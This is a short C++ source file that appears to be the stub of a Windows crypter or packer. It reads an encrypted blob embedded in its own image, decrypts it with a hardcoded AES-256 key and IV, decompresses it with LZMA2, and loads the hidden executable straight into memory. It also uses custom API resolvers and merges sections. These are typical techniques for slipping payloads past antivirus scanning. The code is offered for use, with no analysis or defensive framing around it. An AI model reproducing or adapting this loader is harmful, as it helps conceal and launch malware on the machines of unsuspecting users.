#include <Windows.h>

// WinAPI Functions
#include <Windows.h>

// Resolvers Functions
extern "C" void crt_init();
extern "C" void k32_init();

// Encryption Library
extern "C"
{
#include "aes.h"
}

// Compression Library
#include "lzma2\fast-lzma2.h"

// PE Loader Library
#include "mmLoader.h"

// Merge Data With Code
#pragma comment(linker, "/merge:.rdata=.text")
#pragma comment(linker, "/merge:.data=.text")



// Entrypoint
void func_unpack()
{
	// Internal Data [ Signatures ]
	volatile PVOID data_ptr = (void*)0xAABBCCDD;
	volatile DWORD data_size = 0xEEFFAADD;
	volatile DWORD actual_data_size = 0xA0B0C0D0;
	volatile DWORD header_size = 0xF0E0D0A0;

	// Initializing Resolvers
	k32_init(); crt_init();

	// Getting BaseAddress of Module
	intptr_t imageBase = (intptr_t)GetModuleHandleA(0);
	data_ptr = (void*)((intptr_t)data_ptr + imageBase);

	// Initializing Cryptor
	struct AES_ctx ctx;
	const unsigned char key[32] = {
	0xD6, 0x23, 0xB8, 0xEF, 0x62, 0x26, 0xCE, 0xC3, 0xE2, 0x4C, 0x55, 0x12,
	0x7D, 0xE8, 0x73, 0xE7, 0x83, 0x9C, 0x77, 0x6B, 0xB1, 0xA9, 0x3B, 0x57,
	0xB2, 0x5F, 0xDB, 0xEA, 0x0D, 0xB6, 0x8E, 0xA2
	};
	const unsigned char iv[16] = {
		0x18, 0x42, 0x31, 0x2D, 0xFC, 0xEF, 0xDA, 0xB6, 0xB9, 0x49, 0xF1, 0x0D,
		0x03, 0x7E, 0x7E, 0xBD
	};
	AES_init_ctx_iv(&ctx, key, iv);

	// Casting PVOID to BYTE
	uint8_t* data_ptr_byte = (uint8_t*)data_ptr;

	// Decrypting Buffer
	AES_CBC_decrypt_buffer(&ctx, data_ptr_byte, data_size);

	// Allocating Code Buffer
	uint8_t* code_buffer = (uint8_t*)malloc(actual_data_size);

	// Decompressing Buffer
	FL2_decompress(code_buffer, actual_data_size, &data_ptr_byte[16], data_size - 32);
	memset(data_ptr, 0, data_size);

	// Loading PE File
	DWORD pe_loader_result = 0;
	HMEMMODULE pe_module = LoadMemModule(code_buffer, true, &pe_loader_result);
}